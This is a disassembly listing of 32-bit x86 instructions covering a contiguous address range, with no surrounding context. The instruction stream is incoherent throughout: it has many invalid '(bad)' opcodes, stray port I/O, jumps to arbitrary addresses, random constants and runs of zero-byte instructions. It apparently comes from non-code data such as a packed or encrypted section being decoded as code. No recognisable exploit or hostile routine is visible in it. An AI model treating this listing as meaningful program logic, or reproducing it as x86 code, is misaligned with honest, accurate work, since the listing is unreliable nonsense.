  4180d3:	add    BYTE PTR [eax],al
  4180d5:	fstp   DWORD PTR [esi-0x7547fa9d]
  4180db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180dc:	inc    ebx
  4180dd:	lea    esi,[edx+0x8ae571d]
  4180e3:	adc    BYTE PTR [ebp-0x2d],ch
  4180e6:	cld    
  4180e7:	sbb    eax,0x1289a224
  4180ec:	add    BYTE PTR [edx],ch
  4180ee:	stc    
  4180ef:	push   esp
  4180f0:	mov    ebp,DWORD PTR [ebp+0x6e7feca]
  4180f6:	leave  
  4180f7:	in     eax,dx
  4180f8:	call   DWORD PTR [edx]
  4180fa:	mov    ah,0x1f
  4180fc:	div    bh
  4180fe:	sbb    ebx,DWORD PTR [ebx+0x24]
  418101:	xchg   ecx,eax
  418102:	inc    ch
  418104:	sub    BYTE PTR es:[edi+0x334edb92],ch
  41810b:	add    DWORD PTR [eax],0x39
  41810e:	scas   eax,DWORD PTR es:[edi]
  41810f:	jmp    0x418186
  418111:	cmp    DWORD PTR [edx],esi
  418113:	pop    ebx
  418114:	and    al,0x15
  418116:	add    BYTE PTR [edx+0xc],ah
  418119:	mov    esi,0x22e8167a
  41811e:	add    ch,ah
  418120:	push   DWORD PTR [edi+ebp*8+0x61]
  418124:	jle    0x418198
  418126:	or     esi,DWORD PTR [ebx]
  418128:	cmp    cl,0xae
  41812b:	push   cs
  41812c:	mov    eax,DWORD PTR [ebp-0x2d]
  41812f:	xchg   edx,eax
  418130:	add    cl,ch
  418132:	scas   al,BYTE PTR es:[edi]
  418133:	inc    esp
  418134:	push   eax
  418135:	jb     0x418113
  418137:	xchg   ebp,eax
  418138:	test   BYTE PTR [eax],al
  41813a:	add    BYTE PTR [eax],al
  41813c:	add    BYTE PTR [eax],al
  41813e:	aad    0x16
  418140:	(bad)  
  418142:	mov    ecx,0x2d249317
  418147:	mov    dh,0xe
  418149:	add    BYTE PTR [eax],dh
  41814b:	sub    dh,BYTE PTR [ebx]
  41814d:	nop
  41814e:	mov    ecx,0x7ae80eae
  418153:	test   ebp,ebp
  418155:	jmp    DWORD PTR [edx]
  418157:	push   es
  418158:	xchg   edx,eax
  418159:	not    BYTE PTR [ebp+0x73]
  41815c:	xchg   edi,eax
  41815d:	push   ss
  41815e:	bnd jae 0x41817b
  418161:	cmp    eax,ebx
  418163:	mov    ds:0x74024261,al
  418168:	push   ds
  418169:	push   esi
  41816a:	nop
  41816b:	adc    al,0x12
  41816d:	std    
  41816e:	rcl    BYTE PTR [ebx+0x541a0e6b],0x4b
  418175:	imul   esi,DWORD PTR [esi+0x4689128a],0x34
  41817c:	stc    
  41817d:	and    eax,0xd9968b91
  418182:	mov    esp,0x94453fa6
  418187:	or     eax,eax
  418189:	pop    es
  41818a:	nop
  41818b:	jbe    0x41818b
  41818d:	mov    bl,ah
  41818f:	scas   eax,DWORD PTR es:[edi]
  418190:	shl    bh,cl
  418192:	xchg   edx,edx
  418194:	adc    al,BYTE PTR [eax]
  418196:	adc    eax,0x630cc0cc
  41819b:	(bad)  
  41819d:	out    0x57,al
  41819f:	leave  
  4181a0:	aas    
  4181a1:	std    
  4181a2:	add    BYTE PTR [eax],al
  4181a4:	add    BYTE PTR [eax],al
  4181a6:	add    BYTE PTR [ebx],bl
  4181a8:	in     eax,0x4a
  4181aa:	cmp    esi,DWORD PTR [esi+0x7781128a]
  4181b0:	xchg   DWORD PTR [edx],edx
  4181b2:	mov    DWORD PTR [eax+esi*2],ebx
  4181b5:	xchg   edx,eax
  4181b6:	add    BYTE PTR [eax-0x2c6af075],dl
  4181bc:	ret    
  4181bd:	or     al,0x26
  4181bf:	xchg   ecx,eax
  4181c0:	mov    ebx,DWORD PTR [edi-0x4432e5a3]
  4181c6:	mov    BYTE PTR [ebp-0x6ff3ab12],ch
  4181cc:	loope  0x41820d
  4181ce:	je     0x41823c
  4181d0:	(bad)  
  4181d1:	imul   ebp,edi,0x1b
  4181d4:	mov    eax,0xea130c36
  4181d9:	push   ss
  4181da:	add    BYTE PTR [esi+0x51],al
  4181dd:	fadd   DWORD PTR [edi]
  4181df:	xchg   ecx,eax
  4181e0:	jae    0x418248
  4181e2:	sub    al,0x91
  4181e4:	mov    edx,DWORD PTR [esi-0x214d0340]
  4181ea:	adc    al,0x50
  4181ec:	fnsave ds:0x8d729908
  4181f2:	sub    ecx,esi
  4181f4:	je     0x4181e6
  4181f6:	add    edx,DWORD PTR [ebx]
  4181f8:	imul   ebp,esp,0x24
  4181fb:	adc    eax,DWORD PTR [esp+eiz*8-0x23e9ef10]
  418202:	pop    es
  418203:	nop
  418204:	push   ss
  418205:	into   
  418206:	push   eax
  418207:	mov    esp,0xb5fbce
  41820c:	add    BYTE PTR [eax],al
  41820e:	add    BYTE PTR [eax],al
  418210:	into   
  418211:	cdq    
  418212:	jecxz  0x4181bb
  418214:	mov    eax,ds:0x8e5cf7f2
  418219:	add    al,0xa7
  41821b:	push   eax
  41821c:	add    DWORD PTR [esi-0x37],0xffffffc3
  418220:	pop    ds
  418221:	mov    esp,es
  418223:	mov    ecx,0x84bea060
  418228:	fcomp  DWORD PTR [eax-0x106ac58d]
  41822e:	cmp    eax,0x21dd0614
  418233:	add    BYTE PTR [eax+esi*2-0x5a],cl
  418237:	inc    ebp
  418238:	xchg   esp,eax
  418239:	mov    dl,0x72
  41823b:	cmp    bl,BYTE PTR [ebp+edx*8+0x7a]
  41823f:	xor    eax,0xcf78b964
  418244:	mov    bl,0xae
  418246:	test   edi,0x2764999d
  41824c:	mov    WORD PTR [edi+eiz*1],es
  41824f:	dec    edi
  418250:	mov    ds:0xb7c3e93a,eax
  418255:	mov    esp,esi
  418257:	mov    cl,0x5e
  418259:	cdq    
  41825a:	jecxz  0x41825f
  41825c:	xchg   edi,eax
  41825d:	repnz neg DWORD PTR [edx-0x7c]
  418261:	add    cl,ch
  418263:	push   ebp
  418264:	dec    esi
  418265:	xor    eax,0x33dfa10f
  41826a:	fcomp  st(6)
  41826c:	pop    eax
  41826d:	outs   dx,BYTE PTR ds:[esi]
  41826e:	and    bl,BYTE PTR [edi+0x251e6c8b]
  418274:	add    BYTE PTR [eax],al
  418276:	add    BYTE PTR [eax],al
  418278:	add    dh,cl
  41827a:	clc    
  41827b:	shr    ch,1
  41827d:	xchg   ebx,eax
  41827e:	xor    ebx,eax
  418280:	adc    eax,0xfdc133b3
  418285:	outs   dx,BYTE PTR ds:[esi]
  418286:	xor    ebp,DWORD PTR [ebx-0x3b]
  418289:	(bad)  
  41828a:	mov    dl,0x6a
  41828c:	out    0xde,eax
  41828e:	push   ds
  41828f:	xor    esp,ebp
  418291:	add    ecx,ebp
  418293:	in     eax,dx
  418294:	cld    
  418295:	daa    
  418296:	ret    0xe94e
  418299:	fidivr DWORD PTR [eax-0x3c2147c0]
  41829f:	mov    ds:0xf99853fb,al
  4182a4:	fucom  st(5)
  4182a6:	loop   0x41828c
  4182a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182a9:	adc    ch,BYTE PTR [ebx-0x12]
  4182ac:	ins    BYTE PTR es:[edi],dx
  4182ad:	int    0xa5
  4182af:	push   ebx
  4182b0:	daa    
  4182b1:	mov    ds:0xff332aa0,eax
  4182b6:	repz aam 0xbf
  4182b9:	push   ecx
  4182ba:	scas   al,BYTE PTR es:[edi]
  4182bb:	push   cs
  4182bc:	ficom  DWORD PTR [ebx-0x21]
  4182bf:	push   edx
  4182c0:	lds    ecx,FWORD PTR [edi-0x1b3ee4e8]
  4182c6:	and    ebx,DWORD PTR [ecx+ebp*4]
  4182c9:	int3   
  4182ca:	ficom  DWORD PTR [edx-0x33]
  4182cd:	xchg   edi,eax
  4182ce:	push   ss
  4182cf:	jecxz  0x41828b
  4182d1:	push   ebx
  4182d2:	je     0x4182e7
  4182d4:	jmp    0xe13bda13
  4182d9:	clc    
  4182da:	sub    bh,bl
  4182dc:	push   0x0
  4182de:	add    BYTE PTR [eax],al
  4182e0:	add    BYTE PTR [eax],al
  4182e2:	dec    edi
  4182e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182e4:	xchg   ecx,eax
  4182e5:	inc    esp
  4182e6:	push   esp
  4182e7:	mov    dl,0x44
  4182e9:	add    BYTE PTR [esi+0x1b],bh
  4182ec:	out    0x33,al
  4182ee:	fild   QWORD PTR [edx]
  4182f0:	in     al,dx
  4182f1:	je     0x4182a7
  4182f3:	xor    DWORD PTR [edx-0x8],edx
  4182f6:	test   eax,0x35459960
  4182fb:	arpl   WORD PTR [eax+0x2],di
  4182fe:	mov    esi,0x6c0001e7
  418303:	jae    0x4182f3
  418305:	test   BYTE PTR [ecx],bh
  418307:	jp     0x41832c
  418309:	mov    ebp,DWORD PTR [esi+eiz*8-0x3ca23f6f]
  418310:	cdq    
  418311:	dec    eax
  418312:	cmp    ebp,DWORD PTR [edx]
  418314:	(bad)  
  418315:	je     0x418365
  418317:	sti    
  418318:	mov    ds:0x97b32824,eax
  41831d:	lock lods al,BYTE PTR ds:[esi]
  41831f:	std    
  418320:	bound  ebx,QWORD PTR [esi]
  418322:	mov    ah,0x6a
  418324:	loop   0x418376
  418326:	(bad)  
  418327:	jp     0x41830f
  418329:	push   esi
  41832a:	inc    ebx
  41832b:	mov    cl,0x43
  41832d:	(bad)  
  41832e:	cmp    al,0xb3
  418330:	add    DWORD PTR [eax-0x7],eax
  418333:	sub    edi,ecx
  418335:	jne    0x418327
  418337:	sbb    ebx,ebp
  418339:	call   0x2f52b4
  41833e:	(bad)  
  418340:	dec    ebx
  418341:	mov    edi,DWORD PTR [edi+0xc3d545]
  418347:	add    BYTE PTR [eax],al
  418349:	add    BYTE PTR [eax],al
  41834b:	sub    bl,BYTE PTR [ebp+0x43]
  41834e:	mov    edx,DWORD PTR [ebx+0x64e8c7c1]
  418354:	call   0x3748344
  418359:	xchg   edx,eax
  41835a:	idiv   BYTE PTR ds:0xe1cf97b5
  418360:	sub    eax,0x18d6ffec
  418365:	out    0x85,eax
  418367:	nop
  418368:	add    bh,0x19
  41836b:	aas    
  41836c:	fistp  WORD PTR [ebx+0x13]
  41836f:	xchg   esp,eax
  418370:	jp     0x418344
  418372:	jmp    DWORD PTR [edx+0x62]
  418375:	ror    BYTE PTR [esi+eax*2],cl
  418378:	inc    ecx
  418379:	xchg   esi,eax
  41837a:	rcl    BYTE PTR [edi+0x4f8939cf],0x44
  418381:	frstor [ebx]
  418383:	xchg   ecx,eax
  418384:	mov    esp,DWORD PTR [edi-0x32]
  418387:	js     0x41833e
  418389:	jmp    DWORD PTR ss:[edi-0x3b]
  41838d:	mov    esp,0x4fd15389
  418392:	push   esi
  418393:	or     ebx,DWORD PTR [ebx]
  418395:	pop    esp
  418396:	adc    eax,DWORD PTR [edi+esi*2+0x3e1affd2]
  41839d:	push   0x5c4428c8
  4183a2:	std    
  4183a3:	aaa    
  4183a4:	adc    BYTE PTR [ebx+0x73],dl
  4183a7:	popf   
  4183a8:	push   ebp
  4183a9:	pop    ebx
  4183aa:	adc    edx,eax
  4183ac:	lahf   
  4183ad:	sar    bh,cl
  4183af:	add    BYTE PTR [eax],al
  4183b1:	add    BYTE PTR [eax],al
  4183b3:	add    BYTE PTR [esp+ecx*8],dl
  4183b6:	lds    eax,FWORD PTR [ecx]
  4183b8:	mov    dh,0xc8
  4183ba:	(bad)  
  4183bb:	mov    edi,0x814f3d50
  4183c0:	hlt    
  4183c1:	scas   eax,DWORD PTR es:[edi]
  4183c2:	cdq    
  4183c3:	ret    
  4183c4:	nop
  4183c5:	mov    edx,DWORD PTR [edx]
  4183c7:	push   ecx
  4183c8:	pop    ebp
  4183c9:	pop    ebp
  4183ca:	addr16 jmp 0x787c:0x23a70e47
  4183d2:	aaa    
  4183d3:	call   0x52e09a
  4183d8:	push   ss
  4183d9:	mov    WORD PTR [edx],ss
  4183db:	add    BYTE PTR [eax+0x4c8a9f35],ah
  4183e1:	outs   dx,DWORD PTR ds:[esi]
  4183e2:	dec    BYTE PTR [edi-0x41]
  4183e5:	mov    dl,0xea
  4183e7:	aas    
  4183e8:	pushf  
  4183e9:	repnz idiv DWORD PTR [eax-0x58]
  4183ed:	das    
  4183ee:	(bad)
  4183f1:	add    DWORD PTR [esi],esp
  4183f3:	mov    cl,0xa
  4183f5:	out    dx,eax
  4183f6:	sbb    esp,DWORD PTR [eax+eax*2]
  4183f9:	xchg   ebp,eax
  4183fa:	ret    
  4183fb:	or     esp,DWORD PTR [edx+esi*8+0x2f8878f7]
  418402:	mov    ebp,0xf83d13fc
  418407:	add    edx,DWORD PTR [eax-0x7be81c6b]
  41840d:	repnz idiv DWORD PTR [eax+0x55]
  418411:	sub    esi,DWORD PTR [eax+ebp*1]
  418414:	or     BYTE PTR [edx+0x4d16],0x0
  41841b:	add    BYTE PTR [eax],al
  41841d:	push   ebp
  41841e:	xchg   ebp,eax
  41841f:	je     0x418464
  418421:	les    ebx,FWORD PTR [ecx]
  418423:	jnp    0x418483
  418425:	ret    
  418426:	ret    0xdf4a
  418429:	jae    0x4183f9
  41842b:	pusha  
  41842c:	jmp    FWORD PTR ss:[ebx-0x8]
  418430:	add    edx,DWORD PTR [eax+0x26bcbf8a]
  418436:	xchg   ebp,eax
  418437:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418438:	mov    al,0xc0
  41843a:	call   DWORD PTR [esi+esi*8-0x71]
  41843e:	mov    esi,0xa21903b7
  418443:	jnp    0x41849a
  418445:	cmp    DWORD PTR [eax+ecx*4-0x76b0025],0xfffffff3
  41844d:	pusha  
  41844e:	add    DWORD PTR [ecx-0x4441134a],ebp
  418454:	mul    DWORD PTR [edi+0x135370b2]
  41845a:	pushf  
  41845b:	ins    BYTE PTR es:[edi],dx
  41845c:	adc    ebp,edx
  41845e:	mov    esi,0xb28ff0ef
  418463:	push   cs
  418464:	cdq    
  418465:	push   esp
  418466:	ror    esi,0xd5
  418469:	rcl    DWORD PTR [ecx+ebx*4-0x895c841],cl
  418470:	lds    ebx,FWORD PTR [edx-0x69]
  418473:	out    dx,al
  418474:	ins    DWORD PTR es:[edi],dx
  418475:	dec    esp
  418476:	and    DWORD PTR [edx],ebx
  418478:	aaa    
  418479:	dec    ebx
  41847a:	ror    DWORD PTR [edx-0x24],0xd3
  41847e:	xchg   esp,eax
  41847f:	xchg   ebx,eax
  418480:	test   eax,0x0
  418485:	add    BYTE PTR [eax-0x4e],ah
  418488:	mov    eax,ds:0x49741e8
  41848d:	stc    
  41848e:	outs   dx,DWORD PTR ds:[esi]
  41848f:	aam    0xe
  418491:	ins    DWORD PTR es:[edi],dx
  418492:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418493:	pop    ds
  418494:	push   ds
  418495:	jb     0x4184e7
  418497:	sar    dh,1
  418499:	imul   ecx,esp,0x1e
  41849c:	push   ss
  41849d:	bound  ebx,QWORD PTR [edx+ecx*4-0x6a347812]
  4184a4:	inc    esi
  4184a5:	jle    0x4184e8
  4184a7:	fadd   DWORD PTR [edx]
  4184a9:	sub    DWORD PTR [ebp+esi*8+0x71be0c4c],ecx
  4184b0:	dec    edx
  4184b1:	push   0xffffffd0
  4184b3:	into   
  4184b4:	shl    DWORD PTR [esi+ebp*4+0x28459086],1
  4184bb:	xchg   ebp,eax
  4184bc:	out    dx,al
  4184bd:	jmp    0xf18dafa8
  4184c2:	loope  0x4184c2
  4184c4:	lods   eax,DWORD PTR ds:[esi]
  4184c5:	jmp    0x6250375f
  4184ca:	pop    ebp
  4184cb:	fld    TBYTE PTR [ecx]
  4184cd:	mov    ebx,0xbf40fee5
  4184d2:	pop    ebx
  4184d3:	sbb    dh,BYTE PTR [edx]
  4184d5:	call   0xe5adb66d
  4184da:	xchg   ebx,eax
  4184db:	push   ds
  4184dc:	xor    DWORD PTR [esi],ecx
  4184de:	shl    DWORD PTR [edi-0x19bbff6f],0xec
  4184e5:	dec    esi
  4184e7:	scas   eax,DWORD PTR es:[edi]
  4184e8:	cdq    
  4184e9:	lea    eax,[eax]
  4184eb:	add    BYTE PTR [eax],al
  4184ed:	add    BYTE PTR [eax],al
  4184ef:	shr    ecx,0xeb
  4184f2:	call   DWORD PTR [ecx-0x56ff1e75]
  4184f8:	sbb    bl,BYTE PTR [edx-0x14173008]
  4184fe:	push   edi
  4184ff:	addr16 div ch
  418502:	imul   BYTE PTR [ecx+0x653e6daf]
  418508:	ins    DWORD PTR es:[edi],dx
  418509:	inc    esp
  41850a:	inc    ebp
  41850b:	les    esp,FWORD PTR [esi+esi*2+0xeaf78f8]
  418512:	lea    ebp,[edi+0x6b6a4396]
  418518:	sbb    al,BYTE PTR [edx+0x8]
  41851b:	shl    dh,1
  41851d:	push   ss
  41851e:	in     al,0xfe
  418520:	out    0x97,eax
  418522:	inc    ebp
  418523:	jno    0x4184c9
  418525:	push   esp
  418526:	add    al,0x54
  418528:	mov    DWORD PTR [ebx],ebx
  41852a:	mov    bh,0x36
  41852c:	es in  eax,0x1
  41852f:	cmp    DWORD PTR [edi+0x7fe83b74],ebp
  418535:	sbb    eax,0x99acc050
  41853a:	inc    esi
  41853b:	and    ebx,DWORD PTR [edi+0x44]
  41853e:	call   0x2f516e
  418543:	stc    
  418544:	lods   eax,DWORD PTR ds:[esi]
  418545:	test   DWORD PTR [edx],0x5e4bef1b
  41854b:	xor    dl,dh
  41854d:	ror    BYTE PTR [eax],1
  41854f:	stc    
  418550:	sub    eax,0xcfb
  418555:	add    BYTE PTR [eax],al
  418557:	add    al,ch
  418559:	scas   al,BYTE PTR es:[edi]
  41855a:	push   cs
  41855b:	push   ebx
  41855c:	pop    es
  41855d:	adc    al,0x8b
  41855f:	and    al,0xe5
  418561:	lods   eax,DWORD PTR ds:[esi]
  418562:	push   cs
  418563:	add    BYTE PTR [eax+0x46ea6d56],dl
  418569:	(bad)  
  41856a:	aas    
  41856b:	call   edi
  41856d:	mov    BYTE PTR [ecx+0x1d2ac988],ah
  418573:	fidivr DWORD PTR [esi]
  418575:	test   DWORD PTR [eax+eax*8],eax
  418578:	stos   DWORD PTR es:[edi],eax
  418579:	xor    cl,ch
  41857b:	mov    ah,0xd3
  41857d:	fdivr  DWORD PTR [ebp-0x5f60d876]
  418583:	out    0xc3,eax
  418585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418586:	adc    DWORD PTR [eax],eax
  418588:	imul   ebx,DWORD PTR [ecx-0x5e],0x69
  41858c:	nop
  41858d:	push   ds
  41858e:	out    0x2f,eax
  418590:	js     0x418538
  418592:	dec    edx
  418593:	add    BYTE PTR [eax-0x17f82fea],dl
  418599:	inc    ebx
  41859a:	adc    al,BYTE PTR [eax]
  41859c:	nop
  41859d:	retf   
  41859e:	int3   
  41859f:	add    DWORD PTR ds:0x4f570ec9,ebx
  4185a5:	mov    eax,ds:0xd6c63eae
  4185aa:	lock xchg BYTE PTR [eax+0x23],bh
  4185ae:	(bad)  
  4185af:	loopne 0x418600
  4185b1:	adc    DWORD PTR [esp+edi*4+0x117f6c],edx
  4185b8:	nop
  4185b9:	fisub  WORD PTR [ebx]
  4185bc:	add    BYTE PTR [eax],al
  4185be:	add    BYTE PTR [eax],al
  4185c0:	add    BYTE PTR [edi],dh
  4185c2:	xor    BYTE PTR [edi],ch
  4185c4:	and    al,0x91
  4185c6:	fwait
  4185c7:	adc    al,BYTE PTR [ecx-0x214054]
  4185cd:	or     al,0x30
  4185cf:	push   cs
  4185d0:	adc    al,0x28
  4185d2:	in     al,dx
  4185d3:	add    BYTE PTR ds:[eax-0x5fdc58e2],dl
  4185da:	jae    0x4185ee
  4185dc:	add    dl,BYTE PTR [eax-0xe186065]
  4185e2:	mov    dl,0xb
  4185e4:	add    al,0x90
  4185e6:	inc    edx
  4185e7:	imul   DWORD PTR [eax-0x7d5f10bb]
  4185ed:	aam    0xbe
  4185ef:	test   BYTE PTR [ebx],0x90
  4185f2:	je     0x4185d4
  4185f4:	add    ecx,DWORD PTR [edi-0x62]
  4185f7:	les    eax,FWORD PTR [eax+edx*4]
  4185fa:	mov    dl,0x88
  4185fc:	scas   al,BYTE PTR es:[edi]
  4185fd:	cli    
  4185fe:	mov    dl,0xf9
  418600:	add    edx,DWORD PTR [eax+0x695260e8]
  418606:	addr16 dec edx
  418608:	rcr    DWORD PTR [edx],cl
  41860a:	sub    eax,0x919d49f8
  41860f:	stc    
  418610:	sub    DWORD PTR [ecx-0x4b7886eb],ebp
  418616:	(bad)  
  418617:	clc    
  418618:	add    edx,DWORD PTR [eax+0x170170b2]
  41861e:	not    BYTE PTR [ebx]
  418620:	hlt    
  418621:	add    ebx,esp
  418623:	mov    ah,0x8f
  418625:	add    BYTE PTR [eax],al
  418627:	add    BYTE PTR [eax],al
  418629:	add    BYTE PTR [esi+edx*8+0x359003f8],dh
  418630:	sbb    al,0x20
  418632:	jl     0x4185e6
  418634:	dec    edx
  418635:	mov    bh,0xb3
  418637:	scas   al,BYTE PTR es:[edi]
  418638:	jg     0x418652
  41863a:	inc    esp
  41863b:	mov    dl,0xf7
  41863d:	jbe    0x41860b
  41863f:	(bad)  
  418640:	(bad)  
  418641:	fst    QWORD PTR [ebx+0x73b74ae2]
  418647:	sar    BYTE PTR [edi],cl
  418649:	xchg   ebp,eax
  41864a:	and    esi,DWORD PTR [edx-0x29338309]
  418650:	out    0x6,eax
  418652:	aam    0xf3
  418654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418655:	mov    esi,0x8f54d4a2
  41865a:	mov    ah,0xd6
  41865c:	clc    
  41865d:	add    edx,DWORD PTR [eax-0x6052f0c1]
  418663:	stos   BYTE PTR es:[edi],al
  418664:	(bad)
  41866a:	mov    edx,DWORD PTR [ecx+0x1e6ae9ee]
  418670:	xor    esi,ebp
  418672:	cmp    ebp,eax
  418674:	in     al,dx
  418675:	push   cs
  418676:	dec    eax
  418677:	ss iret 
  418679:	jl     0x41863f
  41867b:	imul   BYTE PTR [ecx]
  41867d:	cli    
  41867e:	loopne 0x4186a7
  418680:	and    ch,BYTE PTR [ecx]
  418682:	jmp    0x77a9d072
  418687:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418688:	adc    ecx,ebp
  41868a:	xchg   ebx,eax
  41868b:	je     0x4186a0
  41868d:	jmp    0x418692
  418692:	add    BYTE PTR [edx],ch
  418694:	js     0x418690
  418696:	fxam   
  418698:	inc    DWORD PTR [ecx+0x34]
  41869b:	out    0x39,al
  41869d:	loopne 0x418711
  41869f:	mov    edx,0x36fd5539
  4186a4:	cmp    ebp,DWORD PTR [ebx+0xd]
  4186a7:	push   0xde02fa3b
  4186ac:	mov    cl,0xd4
  4186ae:	je     0x418718
  4186b0:	fistp  QWORD PTR [edi]
  4186b2:	xor    al,0xcf
  4186b4:	add    ah,BYTE PTR [ebx]
  4186b6:	bound  ebp,QWORD PTR [esi+0x5060dd39]
  4186bc:	aam    0x2e
  4186be:	xchg   ecx,eax
  4186bf:	rol    BYTE PTR [eax+edx*1],cl
  4186c2:	jmp    0xd5747d8f
  4186c7:	add    ebx,DWORD PTR [edx]
  4186c9:	dec    edi
  4186ca:	push   ss
  4186cb:	add    ecx,DWORD PTR [edi-0x2fdb0efc]
  4186d1:	push   cs
  4186d2:	fs int3 
  4186d4:	push   es
  4186d5:	sub    ebx,DWORD PTR [edx]
  4186d7:	pop    ebp
  4186d8:	cmp    eax,eax
  4186da:	fs iret 
  4186dc:	push   es
  4186dd:	xor    al,BYTE PTR [eax]
  4186df:	jp     0x418673
  4186e1:	xor    dl,BYTE PTR [eax]
  4186e3:	stc    
  4186e4:	mov    BYTE PTR [ecx+eax*8+0x20127273],ah
  4186eb:	stc    
  4186ec:	(bad)  
  4186f0:	xchg   DWORD PTR [ecx+eax*8+0xf12fd79],esp
  4186f7:	add    BYTE PTR [eax],al
  4186f9:	add    BYTE PTR [eax],al
  4186fb:	add    BYTE PTR ds:0x2b103250,ch
  418701:	or     dl,bh
  418703:	cmp    ebp,DWORD PTR [esi-0x1272369c]
  418709:	scas   eax,DWORD PTR es:[edi]
  41870a:	or     dl,BYTE PTR [eax-0x3a]
  41870d:	jg     0x418741
  41870f:	and    BYTE PTR [esi],bl
  418711:	inc    ebp
  418712:	jmp    0x418729
  418714:	mov    eax,ds:0x22002e86
  418719:	pop    edi
  41871a:	xor    dl,BYTE PTR [esp+esi*1]
  41871d:	(bad)  
  41871e:	cmp    ecx,DWORD PTR [ebx+0x553ea25b]
  418724:	scas   eax,DWORD PTR es:[edi]
  418725:	or     ebx,ebp
  418727:	call   0x2eebd2
  41872c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41872d:	pop    eax
  41872e:	dec    ecx
  41872f:	pop    ebx
  418730:	mov    al,ds:0x7908d05d
  418735:	or     DWORD PTR [esi],ebp
  418737:	inc    ecx
  418738:	stos   BYTE PTR es:[edi],al
  418739:	pusha  
  41873a:	xchg   edi,eax
  41873b:	je     0x41878a
  41873d:	xchg   DWORD PTR [ebx-0x75],eax
  418740:	add    esi,DWORD PTR [edi-0x48948c13]
  418746:	adc    BYTE PTR [ebp+0x2e],dh
  418749:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41874a:	into   
  41874b:	data16 mov al,0x8d
  41874e:	test   DWORD PTR [edi],0x3618ee5
  418754:	mov    edx,0xe88a0ead
  418759:	mov    ds:0x5a904998,al
  41875e:	in     eax,0xb5
  418760:	add    BYTE PTR [eax],al
  418762:	add    BYTE PTR [eax],al
  418764:	add    BYTE PTR [ecx],bh
  418766:	jo     0x418704
  418768:	ret    0xaaca
  41876b:	in     al,0x41
  41876d:	call   0x61032411
  418772:	xor    BYTE PTR [edi+eiz*8+0x13b8f7],bh
  418779:	dec    edi
  41877a:	ja     0x418735
  41877c:	ror    DWORD PTR [ecx+ebx*4+0x5d270ca3],0xe
  418784:	sbb    BYTE PTR [edi+0x632fa2e7],al
  41878a:	cs in  eax,0xb4
  41878d:	cmp    DWORD PTR [ecx-0x2f70aa56],eax
  418793:	frstor [ebx]
  418795:	cwde   
  418796:	sub    ch,ah
  418798:	mov    ah,0x2c
  41879a:	mov    ebp,0x9fcf0132
  41879f:	add    ebx,0xffffff8f
  4187a2:	cmp    BYTE PTR [ecx+eax*1-0x32],al
  4187a6:	outs   dx,DWORD PTR ds:[esi]
  4187a7:	add    edx,0x19
  4187aa:	loopne 0x4187da
  4187ac:	sbb    al,0x97
  4187ae:	add    eax,0x94f62fd2
  4187b3:	add    DWORD PTR [esp+ebp*4-0x49],0x67
  4187b8:	pop    esp
  4187b9:	mov    ah,0xb7
  4187bb:	pmaxsw mm2,QWORD PTR [edi-0x3378b704]
  4187c2:	jg     0x4187a6
  4187c4:	xchg   ah,ah
  4187c6:	ja     0x4187d2
  4187c8:	or     eax,0x0
  4187cd:	add    BYTE PTR [edi],al
  4187cf:	pop    esp
  4187d0:	sbb    cl,ch
  4187d2:	xchg   edi,eax
  4187d3:	adc    al,0xaf
  4187d5:	add    BYTE PTR [eax+0x6c44699b],dl
  4187db:	jnp    0x418844
  4187dd:	outs   dx,DWORD PTR ds:[esi]
  4187de:	test   BYTE PTR [edx-0x729eb108],dh
  4187e4:	jae    0x41882a
  4187e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187e7:	int    0x70
  4187e9:	fdiv   DWORD PTR [ebx-0x5e]
  4187ec:	jo     0x418796
  4187ee:	mov    bl,0xd2
  4187f0:	pusha  
  4187f1:	mov    eax,0x7686aab3
  4187f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187f7:	lds    esi,FWORD PTR [eax+0x37]
  4187fa:	call   0xed86c4ef
  4187ff:	mov    ebp,0x39a6bf4d
  418804:	mov    esp,0x2fb1781f
  418809:	cmc    
  41880a:	sbb    eax,0xc800c7f8
  41880f:	cmp    esp,DWORD PTR [edi+ebx*1-0x2def3658]
  418816:	fidivr DWORD PTR [ecx]
  418818:	xchg   esp,eax
  418819:	pop    ds
  41881a:	push   0x801f8c39
  41881f:	cmp    DWORD PTR [eax+eiz*1-0x7c],edx
  418823:	cmp    DWORD PTR [eax+eiz*1],esi
  418826:	jo     0x418861
  418828:	das    
  418829:	in     al,dx
  41882a:	or     ah,BYTE PTR [edi-0x292b86f9]
  418830:	mov    DWORD PTR [eax],0x0
  418836:	add    BYTE PTR [ebx+0x38],bl
  418839:	cmp    bl,al
  41883b:	mov    ebx,0xbbf42bb3
  418840:	mov    al,0x23
  418842:	in     al,dx
  418843:	stos   DWORD PTR es:[edi],eax
  418844:	mov    dh,0xa
  418846:	and    BYTE PTR [ecx-0x54],bh
  418849:	popa   
  41884a:	std    
  41884b:	pop    ss
  41884c:	mov    bl,0x36
  41884e:	mov    esi,0x4e0a8098
  418853:	cmp    DWORD PTR [ecx+eiz*2+0x36b30ffd],esp
  41885a:	mov    esi,0xfb0f8078
  41885f:	lds    ebx,FWORD PTR [ebx+0x352d6319]
  418865:	adc    BYTE PTR [eax-0x241f361b],ch
  41886b:	int    0x3b
  41886d:	pop    ebx
  41886e:	or     eax,0x5533a1c
  418873:	mov    ah,0xb3
  418875:	ja     0x41886c
  418877:	mov    bl,BYTE PTR [esi]
  418879:	xor    edx,DWORD PTR [ecx]
  41887b:	mov    DWORD PTR [ebx-0x720c90e2],ebx
  418881:	out    dx,al
  418882:	cs xor al,0xef
  418885:	dec    ebx
  418886:	ret    0x733a
  418889:	add    ebp,ecx
  41888b:	adc    BYTE PTR [esi-0x2f4895d9],bl
  418891:	push   es
  418892:	jmp    0xf1749ea7
  418897:	xchg   ebx,eax
  418898:	jecxz  0x4188dd
  41889a:	xchg   edi,eax
  41889b:	add    BYTE PTR [eax],al
  41889d:	add    BYTE PTR [eax],al
